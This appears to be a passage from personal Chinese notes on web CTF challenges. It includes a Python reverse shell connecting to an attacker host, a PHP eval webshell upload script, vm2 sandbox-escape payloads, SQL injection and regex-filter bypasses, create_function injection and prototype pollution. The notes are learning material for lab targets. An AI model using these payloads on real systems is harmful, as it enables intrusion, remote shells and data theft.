    6. 反弹shell后获取模拟终端

        其实，上面所讲的各种方法获取的shell都不是一个标准的虚拟终端环境，它仅仅是一个标准输入。你会发现存在一个问题，就是即使我们获取了目标虚拟终端控制权限，但是往往会发现其交互性非常的差，回显信息与可交互性非常的差和不稳定，具体见情况有以下几个种。

        - 获取的虚拟终端没有交互性，我们想给添加的账号设置密码或执行sudo等命令，无法完成。
        - 标准的错误输出无法显示，无法正常使用vim等文本编辑器等。
        - 获取的目标主机的虚拟终端使用非常不稳定，很容易断开连接。

        这往往都是因为我们获取的shell并不是标准的虚拟终端，为了能够完成输入密码等操作，我们必须模拟一个真正的终端设备。

        我们其实可以借助于python默认包含的一个pty标准库来获取一个标准的虚拟终端环境。Python在现在一般发行版Linux系统中都会自带，所以使用起来也较为方便，即使没有安装，我们手动安装也很方便。

        我们只需在获取的shell里面输入如下命令，即可模拟一个终端设备：
        ```python
        python -c "import pty;pty.spawn('/bin/bash')"
        ```

1. 搜集（检查HTTP报文+查看初始页面HTML代码）

   1. 尝试在输入框中填入数据提交，可以注意到参数名叫url。先输入普通链接发现没反应，看wp说本题环境用的是python的`urllib`，所以只填一个域名是不行

   2. 输入`/etc/passwd`发现下了一个文件，只不过是以图片形式下的。图片打不开，说明这并不是图片文件，vscode中以二进制/文本格式打开，发现就是`/etc/passwd`文件内容。到这就清楚了，任意文件读取。如果用bp repeater模块重放的话，文件内容会直接展示出来。

2. 从上面知道了有任意文件读取漏洞，那么首先通过proc查看系统进程信息。

    ```sh
    在linux中，proc是一个虚拟文件系统，也是一个控制中心，里面储存是当前内核运行状态的一系列特殊文件；该系统只存在内存当中，以文件系统的方式为访问系统内核数据的操作提供接口，可以通过更改其中的某些文件来改变内核运行状态。它也是内核提供给我们的查询中心，用户可以通过它查看系统硬件及当前运行的进程信息。
    /proc/pid/cmdline 包含了用于开始进程的命令 ；
    /proc/pid/cwd 包含了当前进程工作目录的一个链接 ；
    /proc/pid/environ 包含了可用进程环境变量的列表 ；
    /proc/pid/exe 包含了正在进程中运行的程序链接；
    /proc/pid/fd/ 这个目录包含了进程打开的每一个文件的链接；
    /proc/pid/mem 包含了进程在内存中的内容；
    /proc/pid/stat 包含了进程的状态信息；
    /proc/pid/statm 包含了进程的内存使用信息。
    ```
    payload: 
    ```text
    /page?url=/proc/self/cmdline
    ```
    输出：python2 app.py

3. 读取 app.py 查看源码

    1. 程序起始部分

    在/tmp/secret.txt路径下读取了密钥，并且保存在SECRET_KEY变量里面，然后在系统上删除了源文件，导致我们无法通过任意文件读取漏洞获取密钥。但是没有关闭文件流f，所以我们能够在/proc/self/fd/xxx里找到进程打开的文件信息。

    在 linux 系统中如果一个程序用open()打开了一个文件但最终没有关闭他，即便从外部（如os.remove(SECRET_FILE)）删除这个文件之后，在 /proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的文件描述符，通过这个文件描述符我们即可得到被删除文件的内容。
    
    proc文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。
    还有的是一些以数字命名的目录，他们是进程目录。系统中当前运行的每一个进程都有对应的一个目录在/proc下，以进程的PID号为目录名，他们是读取进程信息的接口。而self目录则是读取进程本身的信息接口，是一个link而self目录则是读取进程本身的信息接口，是一个link

    2. page函数

    这个就是提交主页参数后进行的逻辑，使用url参数提交，可以重定向到输入的url。

    3. manager函数

    ```php
    @app.route('/no_one_know_the_manager')
    def manager():
        key = request.args.get("key")
        print(SECRET_KEY)
        if key == SECRET_KEY:
            shell = request.args.get("shell")
            os.system(shell)
            res = "ok"
        else:
            res = "Wrong Key!"

        return res
    ```

    接口路由/no_one_know_the_manager，接口接收两个参数key和shell，如果key的值和之前读取的密钥SECRET_KEY相等，那么就调用os.system()函数执行shell参数传入的命令，但是不回显结果。需要反弹shell

4. 解题

    1. 利用`/no_one_know_the_manager`路由fantanshell执行系统命令，需要先获取secret key，读取`/proc/self/fd/3`

        **linux 文件系统**

        当一个新进程建立时，此进程将默认有 0，1，2 的文件描述符

        |文件描述符|缩写|描述|
        |-----|-----|-----|
        |0|STDIN|标准输入|
        |1|STDOUT|标准输出|
        |2|STDERR|标准错误|

        其实我们与计算机之间的交互是我可以输入一些指令之后它给我一些输出。
        
        > 我们可以把上面表格中的文件描述符0理解为我和计算机交互时的输入，而这个输入默认是指向键盘的; 文件描述符1理解为我和计算机交互时的输出，而这个输出默认是指向显示器的; 文件描述符2理解为我和计算机交互时，计算机出现错误时的输出，而这个输出默认是和文件描述符1指向一个位置

        所以0，1，2一般会指向终端

        当这个进程去打开一个新的文件时：

        如果此时去打开一个新的文件，它的文件描述符会是 3 。POSIX 标准要求每次打开文件时（含socket）必须使用当前进程中最小可用的文件描述符号

    2. 反弹shell

        python反弹shell的payload如下：

        ```bash
        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("vps",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
        ```
        payload需要url编码一下

        ```bash
        python%20-c%20%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22xx.xx.xx.xx%22,8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27
        ```

## b01lers2020 Welcome to Earth(python 排列组合库)

根据js代码一步一步获得下一页面路径，最终得到打乱的flag,由于不知道key，所以没办法逆推出来，只能爆破。

```python
from itertools import permutations
import re

flag = ["{hey", "_boy", "aaaa", "s_im", "ck!}", "_baa", "aaaa", "pctf"]

# 对flag中的内容进行排列组合
item = permutations(flag)

# 遍历
for i in item:
    k = ''.join(list(i))
    # 匹配
    if re.search('^pctf\{hey_boy[a-zA-Z_]+ck!\}$',k):
    # if k.startswith('pctf{hey_boy') and k[-1] == '}':
        print(k)
```

## [CISCN2019 总决赛Day2-Web1]EasyWeb

**这里主要记录一下思路**
1. 进入首页，发现登录界面，测试sql注入，无果;
2. 尝试访问注册页面，不存在;
3. 看网页源码发现关于图片的请求`image.php?id=`,猜测这里有注入，测试了之后发现没什么效果。
4. 访问robots.txt,提示`*.php.bak`,一开始没理解，尝试`www.php.bak`,发现没有,去找wp才知道，这表示是某一个php文件的备份，如`index.php.bak`,还是没有。结合上面图片的请求，尝试访问`image.php.bak`成功下载源码,核心代码如下
    ```php
    $id=isset($_GET["id"])?$_GET["id"]:"1";
    $path=isset($_GET["path"])?$_GET["path"]:"";

    $id=addslashes($id);
    $path=addslashes($path);
    $id=str_replace(array("\\0","%00","\\'","'"),"",$id);
    $path=str_replace(array("\\0","%00","\\'","'"),"",$path);

    $result=mysqli_query($con,"select * from images where id=' or path='{$path}'");
    ```
    分析源码：
    - 网页接受两个参数id和path
    - addslashes()函数，这个函数会把特殊的字符转义。
    - 比如:单引号会被转义成\',斜杠会转义为\.
    - str_replace会把"\0","%00","\'","'"中的任意一个替换成空。

    这里就存在一个漏洞,当我们传入的`id=\\0`时(我们传入的id时间上是`\0`,第一个`\`相当于一个转义符,它把第二条`\`转义成普通符号),
    - 先经过`addslashes()`函数添加`\`变成`\\0`
    - 然后经过替换函数将`\0`替换为空变成`\`

    所以当id被拼接进sql查询语句时，只剩下了一个`\`,sql查询语句就变成了`select * from images where id='\' or path='{$path}'`,第二个单引号被转义成普通字符, 此时`id='\' or paht='`, 我们就可以把path构造成我们的查询语句，由于没有回显，所以采用bool盲注。

    *记录下解题过程中遇到的几个小问题：*

    使用python脚本注入时，payload末尾注释符直接用"#",不要用"%23"

    爆列明的时候不能用table_name了,因为`'`被过滤,`"`在源码中用来包围字符串,所以爆列名的时候where后面的可以写成table_schema=database(),只不过这样爆出来的是当前数据库中所有表的列名,需要自己分辨对应的表。

    爆出用户名密码后登录就可以了，密码直接用。
5. 进入后发现文件上传
   1. 首先想到一句话木马，思路对了一半，传完以后，页面提示将将上传信息存入了一个log文件中，而这个log文件是个php文件。我们访问这个log文件发现文件中有我们上传的文件的文件名，但是我们不知道我们传的文件在哪里。
   2. 自己做的时候没注意log文件中存了我们上传的文件的文件名，不知道该怎么办
   3. 看了wp才知道可以把一句话木马当成文件名，文件内容不用管，php被过滤，用短标签代替。

        **所以这里记录一下，我们上传的木马文件不知道在哪里但是后天日志文件保存了我们的文件名，而日志文件恰好是php文件，所以我们就可以把上传的文件名称改成一句话木马，一样可以起到木马的作用**

## NPUCTF2020 ezinclude(php临时文件包含)

-----
**知识点--php7 segment fault特性(CVE-2018-14884)**

引用自[PHP LFI 利用临时文件Getshell姿势](https://www.codenong.com/cs106498971/)

>php代码中使用php://filter的 strip_tags 过滤器, 可以让 php 执行的时候直接出现 Segment Fault , 这样 php 的垃圾回收机制就不会在继续执行 , 导致 POST 的文件会保存在系统的缓存目录下不会被清除而不像phpinfo那样上传的文件很快就会被删除，这样的情况下我们只需要知道其文件名就可以包含我们的恶意代码。

>使用php://filter/string.strip_tags导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录，知道文件名就可以getshell。这个崩溃原因是存在一处空指针引用。向PHP发送含有文件区块的数据包时，让PHP异常崩溃退出，POST的临时文件就会被保留，临时文件会被保存在upload_tmp_dir所指定的目录下，默认为tmp文件夹。

>该方法仅适用于以下php7版本，php5并不存在该崩溃。

>利用条件：

>php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复

>php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复
-----

1. 源码中提示 `<!--md5($secret.$name)===$pass -->`,一开始以为是要找到secret但是搞了半天什么都没发现,bp抓包发现cookie的值是个哈希值。去解了一下，没发现有用的东西，看了wp，get传pass，值就是cookie中的hash。
2. 在bp中请求，进入flflflflag.php页面,页面提示了一个`include($_GET['file'])`,典型的文件包含,就想到利用php伪协议读一下源码

    flflflflag.php
    ```php
    <?php
    $file=$_GET['file'];
    if(preg_match('/data|input|zip/is',$file)){
    die('nonono');
    }
    @include($file);
    echo 'include($_GET["file"])';
    ?>
    ```
    过滤了data和input

    index.php
    ```php
    <?php
    include 'config.php';
    @$name=$_GET['name'];
    @$pass=$_GET['pass'];
    if(md5($secret.$name)===$pass){
    echo '<script language="javascript" type="text/javascript">
            window.location.href="flflflflag.php";
    </script>
    ';
    }else{
    setcookie("Hash",md5($secret.$name),time()+3600000);
    echo "username/password error";
    }
    ?>
    <html>
    <!--md5($secret.$name)===$pass -->
    </html>
    ```

    dir.php(第一步扫过网页目录，发现有这几个页面)
    ```php
    <?php
    var_dump(scandir('/tmp'));
    ?>
    ```
    打印临时文件夹中的内容，看网上的wp，说要利用这儿的东西获取flag。

3. 接下来就要利用开头提到的知识点，临时文件Getshell

    payload脚本
    ```php
    import requests
    from io import BytesIO

    payload = '<?php eval($_POST["cmd"]);?>'
    data = {
        'file': BytesIO(payload.encode())
    }

    url = 'http://7d61c871-f58e-4a45-826f-cd5228a013f7.node5.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd'

    res = requests.post(url, files=data, allow_redirects=False).text

    print(res)
    ```

    运行脚本后访问/dir.php,获得临时文件路径，接下来就可以蚁剑连接或者直接在bp里面请求(注意要用post传参，但是file参数要用get方式)。

    蚁剑连接的url：
    ```http
    http://xxxx.buuoj.cn:81/flflflflag.php?file=/tmp/phpxxx
    ```

    这样操作会发现并没有真正的flag。根目录和项目目录下的flag都是假的，看了wp才知道flag放在phpinfo中，和之前遇到的某一到题目一样，flag都是在phpinfo()中。

## [HarekazeCTF2019]encode_and_encode

**知识点**
----------
- JSON基础
- php伪协议


**解题**
--------
1. 点击初始页面的`Source Code`链接会跳转`query.php`并显示源码。

    ```php
     <?php
    error_reporting(0);

    if (isset($_GET['source'])) {
    show_source(__FILE__);
    exit();
    }

    function is_valid($str) {
    $banword = [
        // no path traversal
        '\.\.',
        // no stream wrapper
        '(php|file|glob|data|tp|zip|zlib|phar):',
        // no data exfiltration
        'flag'
    ];
    $regexp = '/' . implode('|', $banword) . '/i';
    if (preg_match($regexp, $str)) {
        return false;
    }
    return true;
    }

    $body = file_get_contents('php://input');
    $json = json_decode($body, true);

    if (is_valid($body) && isset($json) && isset($json['page'])) {
    $page = $json['page'];
    $content = file_get_contents($page);
    if (!$content || !is_valid($content)) {
        $content = "<p>not found</p>\n";
    }
    } else {
    $content = '<p>invalid request</p>';
    }

    // no data exfiltration!!!
    $content = preg_replace('/HarekazeCTF\{.+\}/i', 'HarekazeCTF{&lt;censored&gt;}', $content);
    echo json_encode(['content' => $content]); 
    ```

    简单来说就是根据我们传入的POST数据作为json解析去读取文件，但是过滤了相关关键字，并对结果也进行过滤。

    >php的json_decode在遇到unicode编码时会自动把它转换成正常的字符
    >json解析时的关键字过滤可以采用unicode编码，json是支持用unicode编码直接表示对应字符的，如下两个写法是等价的。
    ```json
    {"poc":"php"}
    {"poc":"\u0070\u0068\u0070"}
    ```

    至于结果的过滤，采用php伪协议的filter进行下base64编码就能绕过。

    payload：
    ```php
    {"page":"\u0070\u0068\u0070://filter/convert.base64-encode/resource=/\u0066\u006c\u0061\u0067"}
    ```
    *关键字也可以不用全部替换成unicode编码，替换其中一个字符也可以*

## GYCTF2020 EasyThinking(thinkphp6.0任意文件操作)

[Thinkphp6.0任意文件写入漏洞复现](https://xz.aliyun.com/t/8546?u_atoken=ee6849f24222ce9b4cd8335e522246c0&u_asession=01pIG7wAQppsbmEfGPNeXSJ8breKJRJ8kMGKTJy3nlP9B-dASJ36q5N5tfCxN6V22FdlmHJsN3PcAI060GRB4YZGyPlBJUEqctiaTooWaXr7I&u_asig=05KVH0LapQWTY-1Oi3pZ7BVNoEVXYfTXZC-fpsUZmYRP_deh9ooz-pY2Q32AF4flVS4p56XEtbOBKl76_sr_fHLaD28M-txkpiIMa0GAqCxsy-zX9cwq2P-PsAqjqKyMvD4F3Dji3lGYabOP5JfvofnhJOKGhInEDQi2OqEzFEQ9hg2QMxYs6lyXb1lFWKql56_iZe6qySc4ymSQaSpszAJnRGcYPE2kk-Y5p6oAe-g74pT9Jcu_zyN-D9ZHDSbSngo0RP7qUB-guxC8utCTeI5DcsKDQaZLAWAv_ve_3i6Ex6gx6UxFgdF3ARCQ86jS_u_XR5hatHQVh06VuUZ-D1wA&u_aref=H4PLUP1Jq9daY1QzJQSoB7dSNAc%3D)

### 知识点

**备份文件泄露**
**ThinkPHP任意文件操作漏洞**

### 解题

1. 打开后，发现有登录、注册、搜索、个人中心这几个功能，测试了一遍没有发现sql注入或者是命令执行的漏洞。尝试访问`/etc/passwd`时，发现了报错信息，提示是thinkphp6.0，去搜索了一下这个框架的漏洞，发现存在任意文件操作漏洞(这个漏洞是在存储session时导致的文件写入，如果session可控的话就会照成任意文件操作或者任意文件删除的漏洞)。但是不知都怎么利用，看了一下wp。
2. 看了wp才知道，要扫描网站目录，存在源码泄露。首先要找到可以控制session的地方。

    在web\app\home\controller\Member.php
    ```php
    public function search()
    {
        if (Request::isPost()){
            # 判断登录
            if (!session('?UID'))
            {
                return redirect('/home/member/login');            
            }
            $data = input("post.");
            $record = session("Record");
            if (!session("Record"))
            {
                // 利用点
                session("Record",$data["key"]);
            }
            else
            {
                $recordArr = explode(",",$record);
                $recordLen = sizeof($recordArr);
                if ($recordLen >= 3){
                    array_shift($recordArr);
                    // 利用点
                    session("Record",implode(",",$recordArr) . "," . $data["key"]);
                    return View::fetch("result",["res" => "There's nothing here"]);
                }

            }
            session("Record",$record . "," . $data["key"]);
            return View::fetch("result",["res" => "There's nothing here"]);
        }else{
            return View("search");
        }
    }
    ```
    在Member类中找到 search方法，发现有两处可以通过外部传参设置session的值。

    **getshell**

    接下来注册一个账号，在登录时将cookie改成xxxxx.php(总共32位)

    然后在搜索框写入木马

    蚁剑连接，使用disable_functions插件绕过函数限制，根目录拿到flag

## BJDCTF2020 EzPHP(PHP绕过+代码注入)

### 知识点

   1. $_SERVER 函数中‘QUERY_STRING’

   2. preg_match绕过

   3. $_REQUEST绕过

   4. file_get_contents绕过(文件包含漏洞)

   5. sha1比较

   6. create_function()代码注入

### 解题

打开题目查看源代码，发现注释

base32解码得到1nD3x.php

- **第一步 `QUERY_STRING`绕过**
    ```php
    if($_SERVER) { 
        if (
            preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i', $_SERVER['QUERY_STRING'])
            )  
            die('You seem to want to do something bad?'); 
    } 
    ```
    `$_SERVER['QUERY_STRING']`不会进行urldecode，`$_GET[]`会，用url编码可以绕过

- **第二步 preg_match绕过**
    ```php
    if (!preg_match('/http|https/i', $_GET['file'])) {
        if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { 
            $file = $_GET["file"]; 
            echo "Neeeeee! Good Job!<br>";
        } 
    } else die('fxck you! What do you want to do ?!'); 
    ```
    和之前遇到的题一样，preg_match会自动忽略换行符，字符串末尾加上`%0a`来绕过

    payload: `debu=aqua_is_cute%0a`

- **第三步 `$_REQUEST`绕过**
    ```php
    if($_REQUEST) { 
        foreach($_REQUEST as $value) { 
            if(preg_match('/[a-zA-Z]/i', $value))  
                die('fxck you! I hate English!'); 
        } 
    } 
    ```
    `$_REQUEST`在同时接收GET和POST参数时，POST优先级更高,也就是说相同的参数名，POST传入的数据会覆盖GET传入的数据

- **第四步 php伪协议**
    ```php
    if (file_get_contents($file) !== 'debu_debu_aqua')
        die("Aqua is the cutest five-year-old child in the world! Isn't it ?<br>");
    ```
    用`data:text/plain,`,或者`php://input`传入值

    payload: `file=data:text/plain,debu_debu_aqua`

- **第五步 sha1绕过**
    ```php
    if ( sha1($shana) === sha1($passwd) && $shana != $passwd )
    {
        extract($_GET["flag"]);
        echo "Very good! you know my password. But what is flag?<br>";
    } else{
        die("fxck you! you don't know my password! And you don't know sha1! why you come here!");
    }
    ```
    sha1函数无法处理数组，传入数组时，结果为false

    payload: `shana[]=1&passwd[]=0`

以上五步的payload 经过url编码传入，同时post传入file=1&debu=1

*注意：只对参数名和参数值中的字母进行url编码，符号不要编码，符号编码后没办法正常解析*

- **第六步 create_function()代码注入**
    ```php
    if(preg_match('/^[a-z0-9]*$/isD', $code) ||
    preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&|\$|\*|\||\<|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i', $arg) ) { 
        die("<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="); 
    } else { 
        include "flag.php";
        $code('', $arg); 
    }
    ```

    `$code`和`$arg`可控，利用`$code('',$arg)`进行`create_function`注入
    ```php
    function a('',$arg){
        return $arg
    }
    ```
    `$arg=}代码;//`,则`}`闭合了函数`a()`，同时//注释了后面的内容
    ```php
    function a('',$arg){
        return }代码;//
    }
    ```
    payload:`flag[code]=create_function&flag[arg]=}var_dump(get_defined_vars());//`

    对参数名称和值进行url编码后放到前五步的payload后面

    访问后会得到flag的位置，因为`inc`被过滤，include用不了，这里用require

    `require(php://filter/read=convert.base64-encode/resource=rea1fl4g.php)`

    对括号中的内容取反然后进行url编码

    payload: `require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f))`

    替换上一步中的var_dump(get_defined_vars())

    得到的内容base64解码获得flag。

## GKCTF2021 easycms(cms漏洞)

首先有个提示，后台密码五位弱口令(这种一般就是初始密码没有改`admin`或者`12345`)

像这种题目给了提示可以搜索一下cms漏洞，会有相应的poc

这道题存在多种解法，任意文件下载，木马getshell，RCE

在进行所有操作前网页会要求创建一个文本文件。

在设计->组件->素材处会发现文件上传，首先随便上传一个txt文件，然后编辑，更改文件名 `../../../../../system/tmp/xxxx`(xxxx是网站提示的文件名，每次都不一样)。之后就能正常操作

任意文件下载：设计->主题->自定义->导出主题，抓包，theme名称就是文件名的base64加密后的内容，可以更改为/flag的base64加密后的内容，用bp重放模块就可以在响应处直接看到flag

RCE：在高级修改模板文件内容为RCE代码就能拿到flag，或者写个木马，蚁剑连接也行。

## Js-vm2沙箱逃逸

### HFCTF2020 JustEscape

#### 解题思路

首页有数学运算公式和一个获取当前时间的功能，还提示了一个"真的是php"，看到这可以考虑其他的语言了

node.js中也有eval函数

使用Error().stack测试，回显了报错信息，发现是vm2沙箱逃逸

[vm2沙箱逃逸poc](https://github.com/patriksimek/vm2/issues/225)

直接用会被waf拦截

#### Js关键字过滤绕过

1. payload1

    测试得到以下字符被过滤了

    ['for', 'while', 'process', 'exec', 'eval', 'constructor', 'prototype', 'Function', '+', '"',''']

    prototype被过滤了，就可以换成

    `${`${`prototyp`}e`}`

    ```js
    (function (){
        TypeError[`${`${`prototyp`}e`}`][`${`${`get_pro`}cess`}`] = f=>f[`${`${`constructo`}r`}`](`${`${`return proc`}ess`}`)();
        try{
            Object.preventExtensions(Buffer.from(``)).a = 1;
        }catch(e){
            return e[`${`${`get_pro`}cess`}`](()=>{}).mainModule[`${`${`requir`}e`}`](`${`${`child_proces`}s`}`)[`${`${`exe`}cSync`}`](`cat /flag`).toString();
        }
    })()
    ```

2. payload2(join字符串拼接)

    ```js
    (()=>{ TypeError[[`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e`][`join`](``)][`a`] = f=>f[[`c`,`o`,`n`,`s`,`t`,`r`,`u`,`c`,`t`,`o`,`r`][`join`](``)]([`r`,`e`,`t`,`u`,`r`,`n`,` `,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))(); try{ Object[`preventExtensions`](Buffer[`from`](``))[`a`] = 1; }catch(e){ return e[`a`](()=>{})[`mainModule`][[`r`,`e`,`q`,`u`,`i`,`r`,`e`][`join`](``)]([`c`,`h`,`i`,`l`,`d`,`_`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))[[`e`,`x`,`e`,`c`,`S`,`y`,`n`,`c`][`join`](``)](`cat /flag`)[`toString`](); } })()
    ```

## 极客大挑战 2020 Roamphp1-Welcome

进去提示405 Method Not Allowed，因为一开始用的get方法，get不行就换post试一下，post可以看到了源码

```php
<?php
error_reporting(0);
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
header("HTTP/1.1 405 Method Not Allowed");
exit();
} else {
    
    if (!isset($_POST['roam1']) || !isset($_POST['roam2'])){
        show_source(__FILE__);
    }
    else if ($_POST['roam1'] !== $_POST['roam2'] && sha1($_POST['roam1']) === sha1($_POST['roam2'])){
        phpinfo();  // collect information from phpinfo!
    }
} 
```

第一层if(请求方法)过去了，绕后就是第二层if(要求两个字符串原始值不一样，sha1加密后一样)数组绕过，传入两个数组就行了

flag在phpinfo页面里面，需要找一下。

## EasyBypass

简单的正则匹配绕过，这里主要记录一下解题思路

进去就是源码

```php
<?php

highlight_file(__FILE__);

$comm1 = $_GET['comm1'];
$comm2 = $_GET['comm2'];


if(preg_match("/\'|\`|\\|\*|\n|\t|\xA0|\r|\{|\}|\(|\)|<|\&[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is", $comm1))
    $comm1 = "";
if(preg_match("/\'|\"|;|,|\`|\*|\\|\n|\t|\r|\xA0|\{|\}|\(|\)|<|\&[^\d]|@|\||ls|\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is", $comm2))
    $comm2 = "";

$flag = "#flag in /flag";

$comm1 = '"' . $comm1 . '"';
$comm2 = '"' . $comm2 . '"';

$cmd = "file $comm1 $comm2";
system($cmd);
?>
```

file命令返回文件类型。

一开始想着从comm2入手，在comm2上构造payload，但是试了几次后comm2总是被替换成空，后来一想从comm1也可以构造payload

payload
```url
comm1=";head+/fla*;"
```
经过处理后comm1就变成了
```sh
"";head /fla*;"" ;
```
最后执行的命令就是
cmd:
```sh
file "";head /fla*;"" ;
```
不知道为什么代码里面过滤了"*",但是构造payload时仍然可以用。这里有点看不懂

看其他wp的payload：
```php
?comm1=index.php";tac /fla?;"&comm2
```
?表示任意一个字符，从而来绕过flag的匹配。

## FireshellCTF2020 Caas(C语言include 报错引出文件内容)

功能就是将用户提交的c源代码编译成elf可执行文件

猜测后端是将用户提交的代码保存成c源文件，然后调用系统命令gcc编译文件
如果编译报错，将命令执行的返回值返回给用户，如果编译成功，将输出的elf文件返回给用户

看过wp，发现可以利用 *编译器的include报错读出引用文件的部分内容。*

```c
#include "/etc/passwd"
```
提交以后会输出报错信息，会发现在报错信息中就有文件中的内容

同理可以用这种方式获取flag。

## HarekazeCTF2019 Avatar Uploader 1(Misc+PHP图像类型判断)

1. 源码

    ```php
    <?php
    error_reporting(0);

    require_once('config.php');
    require_once('lib/util.php');
    require_once('lib/session.php');

    $session = new SecureClientSession(CLIENT_SESSION_ID, SECRET_KEY);

    // check whether file is uploaded
    if (!file_exists($_FILES['file']['tmp_name']) || !is_uploaded_file($_FILES['file']['tmp_name'])) {
    error('No file was uploaded.');
    }

    // check file size
    if ($_FILES['file']['size'] > 256000) {
    error('Uploaded file is too large.');
    }

    // check file type
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $type = finfo_file($finfo, $_FILES['file']['tmp_name']);
    finfo_close($finfo);
    if (!in_array($type, ['image/png'])) {
    error('Uploaded file is not PNG format.');
    }

    // check file width/height
    $size = getimagesize($_FILES['file']['tmp_name']);
    if ($size[0] > 256 || $size[1] > 256) {
    error('Uploaded image is too large.');
    }
    if ($size[2] !== IMAGETYPE_PNG) {
    // I hope this never happens...
    error('What happened...? OK, the flag for part 1 is: <code>' . getenv('FLAG1') . '</code>');
    }

    // ok
    $filename = bin2hex(random_bytes(4)) . '.png';
    move_uploaded_file($_FILES['file']['tmp_name'], UPLOAD_DIR . '/' . $filename);

    $session->set('avatar', $filename);
    flash('info', 'Your avatar has been successfully updated!');
    redirect('/');
    ```

    一开始看到头像上传想的是上传木马，试了几次发现之前的绕过方式都不太行，看了wp才知道原题提供了源码的。

    第三处if检查文件类型是通过文件头16进制来检查的，它可以检测图片的MIME值

    getimagesize()函数检测图片信息，它的返回值如下：

    ```txt
    索引 0 给出的是图像宽度的像素值
    索引 1 给出的是图像高度的像素值
    索引 2 给出的是图像的类型，返回的是数字，其中1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 = BMP，7 = TIFF(intel byte order)，8 = TIFF(motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM
    索引 3 给出的是一个宽度和高度的字符串，可以直接用于 HTML 的 <image> 标签
    索引 bits 给出的是图像的每种颜色的位数，二进制格式
    索引 channels 给出的是图像的通道值，RGB 图像默认是 3
    索引 mime 给出的是图像的 MIME 信息，此信息可以用来在 HTTP Content-type 头信息中发送正确的信息，如： header("Content-type: image/jpeg");
    ```

    而要拿到flag就要通过第5个if判断

    ```php
    if ($size[2] !== IMAGETYPE_PNG) {
    // I hope this never happens...
    error('What happened...? OK, the flag for part 1 is: <code>' . getenv('FLAG1') . '</code>');
    }
    ```
2. 解题

    1. finfo_file()函数检测上传图片的类型是否是image/png，我们需要通过这个函数的检测，不然会返回error

    2. getimagesize函数返回图片信息，第三个元素不能等于IMAGETYPE_PNG，也就是不能为3，因此我们需要绕过这个函数

    要修改图片信息，可以用001editor打开图片，第一个函数是通过文件头来判断的，第二个函数是通过读取后面的内容来判断的，所以我们可以保留图片的文件头，而删掉除了文件头以外的其他信息(最方便)，或者是把其他信息改一下(暂时没有尝试)然后上传，最终就得到了flag。

## JS 原型链污染

[P神原型链污染](https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript)

1. 原型链概念

    在 Javascript，每一个实例对象都有一个prototype属性，prototype 属性

    可以向对象添加属性和方法。

    ```javascript
    object.prototype.name=value
    ```

    在 Javascript，每一个实例对象都有一个__proto__属性，这个实例属性 指向对象的原型对象(即原型)。可以通过以下方式访问得到某一实例对 象的原型对象：

    ```javascript
    objectname["__proto__"]

    objectname.__proto__

    objectname.constructor.prototype
    ```

2. 污染原理

    object[a][b] = value 如果可以控制a、b、value的值，将a设置为 proto，我们就可以给object对象的原型设置一个b属性，值为value。这样 所有继承object对象原型的实例对象在本身不拥有b属性的情况下，都会拥有b 属性，且值为value。

### GYCTF2020 Ez_Express

1. 见到登录框，测试了一下sql注入，没什么反应；试一下robots.txt, 404；又试了一下www.zip,发现了源码，是js。
2. js接触不多，到这只能看wp

    >关键源码在app.js和index.js中，直接开始代码审计吧
    /route/index.js中用了merge()和clone()，必是原型链的问题了

    >思路：js审计如果看见merge，clone函数，可以往原型链污染靠，跟进找一下关键的函数，找污染点
    切记一定要让其__proto__解析为一个键名

3. 在index.js种发现了漏洞

    ```javascript
    const merge = (a, b) => {
    for (var attr in b) {
        if (isObject(a[attr]) && isObject(b[attr])) {
        merge(a[attr], b[attr]);
        } else {
        a[attr] = b[attr];
        }
    }
    return a
    }
    const clone = (a) => {
    return merge({}, a);
    }
    ```

    往下在`/action`的路由中找到`clone()`的位置

    ```javascript
    router.post('/action', function (req, res) {
